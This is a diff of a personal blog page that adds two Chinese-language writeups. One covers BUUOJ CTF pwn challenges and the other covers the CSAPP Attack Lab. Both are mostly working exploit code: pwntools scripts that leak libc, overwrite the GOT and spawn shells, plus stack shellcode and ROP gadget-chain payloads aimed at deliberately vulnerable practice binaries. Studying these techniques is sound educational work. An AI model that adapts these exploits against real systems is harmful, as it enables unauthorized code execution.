@@ -179,6 +179,258 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/22/Writeup-for-Second-Week/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Garen Wang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Garen Wang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/22/Writeup-for-Second-Week/" class="post-title-link" itemprop="url">Writeup for Second Week</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-22 11:11:17" itemprop="dateCreated datePublished" datetime="2021-01-22T11:11:17+08:00">2021-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
+              </span>
+
+          
+            <span id="/2021/01/22/Writeup-for-Second-Week/" class="post-meta-item leancloud_visitors" data-flag-title="Writeup for Second Week" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/01/22/Writeup-for-Second-Week/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/22/Writeup-for-Second-Week/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>32位格式化字符串漏洞，有几个特点需要注意：</p>
+<ol>
+<li>测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。</li>
+<li>用格式化字符串漏洞泄露libc的时候用<code>%s</code>，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。</li>
+<li><code>fmtstr_payload</code>填了四个参数，其中注意<code>numbwritten</code>参数，意思是格式化字符串中前面已有的字符数。0xa就是<code>Repeater:A</code>的位数。</li>
+<li>最后劫持了<code>printf</code>的got表，填个分号做命令分割，就直接拿shell了。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;26090&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;XAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + p32(puts_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Repeater:A&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">8</span>)[-<span class="number">4</span>:]</span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line">log.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># log.info(hex(system_addr))</span></span><br><span class="line"><span class="comment"># log.info(hex(binsh_addr))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>, numbwritten=<span class="number">0xa</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>在当前栈空间外面写shellcode，gdb调出偏移，借助最开始泄露的地址写入shellcode在栈上的地址，就能跳转到栈上的shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;28529&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">buf = p.recvline().strip()</span><br><span class="line">base_addr = <span class="built_in">int</span>(buf, <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x16</span> - <span class="number">0x8</span> + <span class="number">0x4</span>) + p32(base_addr - <span class="number">0x1c</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>0x28的栈溢出只能输入0x30，这时候要用到栈劫持，新的知识点。</p>
+<p>大体思路就是先通过一个<code>leave</code>然后<code>ret</code>的gadget强行把栈缩小，然后我们就在当前部分的栈帧里去布置就可以了。</p>
+<p>直接粘核心exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">str_addr = ebp_addr - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(str_addr + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(str_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
+<p>这个payload的构造挺巧妙的，稍微分析下：</p>
+<p>最后的0x8个字节用字符串起始地址覆盖了ebp，后面紧接着<code>leave</code>和<code>ret</code>，<code>leave</code>的时候直接调到字符串其实地址，<code>ret</code>的时候从<code>aaaa</code>跳到后面的system函数地址。system参数，同样是用在栈上写字符串的方法解决的。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/17/CSAPP-Attack-Lab-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Garen Wang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Garen Wang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/17/CSAPP-Attack-Lab-Writeup/" class="post-title-link" itemprop="url">CSAPP Attack Lab Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-17 11:45:32" itemprop="dateCreated datePublished" datetime="2021-01-17T11:45:32+08:00">2021-01-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
+              </span>
+
+          
+            <span id="/2021/01/17/CSAPP-Attack-Lab-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="CSAPP Attack Lab Writeup" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/01/17/CSAPP-Attack-Lab-Writeup/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/17/CSAPP-Attack-Lab-Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>今天顺带把attack lab做完了，算是小小地复习了下栈溢出和ROP吧。</p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><del>最开始我甚至都不知道这个lab要怎么开始做起，跑都跑不起来</del></p>
+<p><code>hex2raw</code>读入以空格作为分隔的一个个字节，编码成一个个机器码。就跟pwntools里面的u32、u64差不多的作用。不然直接输入是没有用的。</p>
+<p>直接运行<code>ctarget</code>或<code>rtarget</code>会没办法运行，报了个<code>Running on an illegal host</code>的错误。</p>
+<p>我们加个<code>-q</code>的参数就能跑了。或者<code>-i</code>然后加上文件名，从文件里读入。</p>
+<p>运行的方法是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;ctarget -q</span><br><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;rtarget -q</span><br></pre></td></tr></table></figure>
+<h2 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h2><p>这部分主要是利用了栈溢出，虽然checksec查到了canary，但在那个<code>Gets</code>函数里面看看汇编其实是没有的。</p>
+<p>同时栈内存可执行，这是Level 2跟3的伏笔。</p>
+<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>最简单的<code>gets</code>函数溢出，只要用<code>touch1</code>的地址覆盖rbp就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>第二个要求利用栈溢出调用<code>touch2</code>，同时携带一个int参数，要求值跟cookie一致。</p>
+<p>可以直接ROP解决，而这里因为栈可执行，还有往栈里写shellcode的做法，做下记录。</p>
+<p>构造shellcode当然先写汇编，有两种写法：</p>
+<h4 id="已知cookie再写入"><a href="#已知cookie再写入" class="headerlink" title="已知cookie再写入"></a>已知cookie再写入</h4><p>在<code>cookie.txt</code>里面就有cookie的值，我们只要把这个值赋给rdi就可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>因为是AT&amp;T语法，所以可以直接用<code>gcc -c</code>编译出未链接文件，然后我们objdump一下就可以看到对应的shellcode了。</p>
+<p><code>ret</code>命令相当于一个<code>pop rip</code>，将<code>rip</code>指向了<code>0x4017ec</code>，即调用了<code>touch2</code>。</p>
+<p>但是直接写shellcode得能执行啊，怎么让它执行？把rbp的值写成shellcode在栈上的地址。</p>
+<p>这里又有一个小细节：<strong>字符串在栈里面通过push写入的话要翻转顺序，而shellcode需要正序写入。</strong>前面要写hello world的shellcode，字符串是反向写入的，因为我们读字符串自然是从低地址到高地址的。而shellcode就直接写就完事了。</p>
+<p>所以我们需要获取栈的地址。那我们用gdb调一调就可以找到字符串的地址了：</p>
+<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
+<h4 id="从程序中真正获取cookie的值"><a href="#从程序中真正获取cookie的值" class="headerlink" title="从程序中真正获取cookie的值"></a>从程序中真正获取cookie的值</h4><p>可以用汇编来获取地址的值，比如这样写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq $0x006044e4, %rdi</span><br><span class="line">movq (%rdi), %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>这样就算cookie是个随机数，也能跳转，比较普适。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 e4 44 60 00 48</span><br><span class="line">8b 3f 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
+<p>Jan 17 upd：第二种shellcode的汇编也可以这样写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq 0x006044e4, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>mov和lea的区别，就是mov会做一次dereference，而lea只进行计算。</p>
+<p>只要mov的src不是一个immediate（最前面有一个$号）而是一个地址，默认都会把src这个地址dereference之后的值赋给dest。而lea就只是单纯计算之后把结果赋给dest。</p>
+<p>对寄存器的dereference，还是打一个括号。上述强调的是immediate和memory的一个区别。</p>
+<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>第三个要求我们继续利用那个漏洞跳入<code>touch3</code>，顺便携带一个字符串地址，还要跑过<code>hexmatch</code>函数的检测。</p>
+<p>我们在基于Level 2在栈上写shellcode的思想，再在栈上储存一个字符串，然后rdi就指向这个字符串的地址，这样才能控制。</p>
+<p>我们知道cookie值是0x59b997fa，但是我们要的是字符串且没有起始的0x。</p>
+<p>所以我们要弄到”59b997fa”这段字符串，实际上写入的时候就得写入ASCII码了。</p>
+<p>但是不能随便在栈里面随便找个地方存，因为后面执行<code>hexmatch</code>时，会把部分栈上内容overwrite掉，所以可以找个保险的地方，直接存到rbp紧接着的地址。</p>
+<p>shellcode部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>这里 解释一下：<code>0x5561dca8 = 0x5561dc78 + 0x28 + 0x8</code></p>
+<p>把它翻译成机器码，粘在字符串里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+<p>啊？前面不是说字符串要反过来嘛？怎么现在是正的？因为我们不是通过push来写入的。</p>
+<p>众所周知，push进去的值是little endian储存的，所以字符串要反过来才是正确的顺序。</p>
+<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
+<h2 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h2><p>第二部分相比第一部分加上了很多保护：打开了ASLR，NX Enable，把前面在栈里面写shellcode的想法杀死了。现在就可以使用ROP了。</p>
+<p><code>farm.c</code>中似乎是些没用的函数，不过当变成机器码并且截取一小部分时，会有意想不到的收货。这个在<code>attacklab.pdf</code>里写的很清楚。</p>
+<p>而我们大可直接用ROPgadget来做。。。</p>
+<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>用ROP来实现前面第二关的效果。直接用一个pop rdi的gadget就可以了。</p>
+<p>略。</p>
+<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>现在就是真正的拼gadget了。</p>
+<p>这里有一个问题：因为还是必须在栈里面存字符串，那怎么获取地址？栈地址已经会变化了。</p>
+<p>在看别人博客的时候，看见一个非常非常重要的gadget：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004019d6 : lea rax, [rdi + rsi] ; ret</span><br></pre></td></tr></table></figure>
+<p>只要其中一个是栈上的地址，我们控制另一个，就可以获得栈上任意处的地址。</p>
+<p>开始扫gadget：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--only &quot;mov|ret&quot;</span><br><span class="line">0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret</span><br><span class="line">0x0000000000400f63 : mov byte ptr [rip + 0x20454e], 1 ; ret</span><br><span class="line">0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret</span><br><span class="line">0x0000000000401b10 : mov dword ptr [rip + 0x2045ee], eax ; ret</span><br><span class="line">0x0000000000402dd7 : mov eax, 0 ; ret</span><br><span class="line">0x0000000000401994 : mov eax, 1 ; ret</span><br><span class="line">0x0000000000401a07 : mov eax, esp ; ret</span><br><span class="line">0x0000000000401a9a : mov eax, esp ; ret 0x8dc3</span><br><span class="line">0x00000000004019a3 : mov edi, eax ; ret</span><br><span class="line">0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret</span><br><span class="line">0x0000000000401a06 : mov rax, rsp ; ret</span><br><span class="line">0x00000000004019a2 : mov rdi, rax ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--only &quot;pop|ret&quot;</span><br><span class="line">0x00000000004021d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000004018f5 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000004011aa : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000401dab : pop rbx ; ret</span><br><span class="line">0x000000000040141b : pop rdi ; ret</span><br><span class="line">0x0000000000402b17 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401383 : pop rsi ; ret</span><br><span class="line">0x0000000000402b13 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040137f : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000004021d8 : pop rsp ; pop r13 ; ret</span><br><span class="line">0x00000000004018f8 : pop rsp ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
+<p>（略去了一部分没用的gadget）</p>
+<p>我们可以先得到rsp的值，mov到rax，然后mov到rdi，这样rdi就拿到了栈顶的地址。</p>
+<p>接下来通过pop rsi的gadget，我们再输入偏移，就可以通过前面的lea获取我们输入的字符串的地址。</p>
+<p>最后mov到rdi上，就可以跳转到<code>touch3</code>了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">83 13 40 00 00 00 00 00</span><br><span class="line">40 00 00 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/16/glibc-Heap-Learning/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1455,7 +1707,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
